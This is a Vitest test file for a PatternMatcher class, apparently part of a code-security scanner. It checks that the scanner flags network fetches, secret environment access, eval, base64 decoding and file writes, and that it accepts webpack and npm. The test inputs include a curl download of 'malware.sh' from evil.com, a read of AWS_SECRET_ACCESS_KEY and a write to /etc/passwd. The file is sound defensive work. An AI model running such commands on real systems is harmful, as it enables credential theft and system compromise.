import { describe, it, expect } from 'vitest';
import { PatternMatcher } from '../../src/security/PatternMatcher.ts';

describe('PatternMatcher', () => {
  describe('detectPatterns', () => {
    it('should detect network requests', () => {
      const matcher = new PatternMatcher();
      const code = 'curl https://evil.com/malware.sh';
      const patterns = matcher.detectPatterns(code);
      expect(patterns.length).toBeGreaterThan(0);
      expect(patterns[0].type).toBe('network_request');
    });

    it('should detect environment variable access', () => {
      const matcher = new PatternMatcher();
      const code = 'process.env.AWS_SECRET_ACCESS_KEY';
      const patterns = matcher.detectPatterns(code);
      expect(patterns.length).toBeGreaterThan(0);
      expect(patterns[0].type).toBe('env_access');
    });

    it('should detect code execution', () => {
      const matcher = new PatternMatcher();
      const code = 'eval(maliciousCode)';
      const patterns = matcher.detectPatterns(code);
      expect(patterns.length).toBeGreaterThan(0);
      expect(patterns[0].type).toBe('code_execution');
    });

    it('should detect obfuscation', () => {
      const matcher = new PatternMatcher();
      const code = 'atob(base64Encoded)';
      const patterns = matcher.detectPatterns(code);
      expect(patterns.length).toBeGreaterThan(0);
      expect(patterns.some(p => p.type === 'obfuscation')).toBe(true);
    });

    it('should detect file system operations', () => {
      const matcher = new PatternMatcher();
      const code = 'fs.writeFile("/etc/passwd", data)';
      const patterns = matcher.detectPatterns(code);
      expect(patterns.length).toBeGreaterThan(0);
      expect(patterns[0].type).toBe('file_system');
    });
  });

  describe('isLegitimatePattern', () => {
    it('should detect build tools', () => {
      const matcher = new PatternMatcher();
      const code = 'webpack --config webpack.config.js';
      const isLegit = matcher.isLegitimatePattern(code);
      expect(isLegit).toBe(true);
    });

    it('should detect package managers', () => {
      const matcher = new PatternMatcher();
      const code = 'npm install';
      const isLegit = matcher.isLegitimatePattern(code);
      expect(isLegit).toBe(true);
    });
  });
});
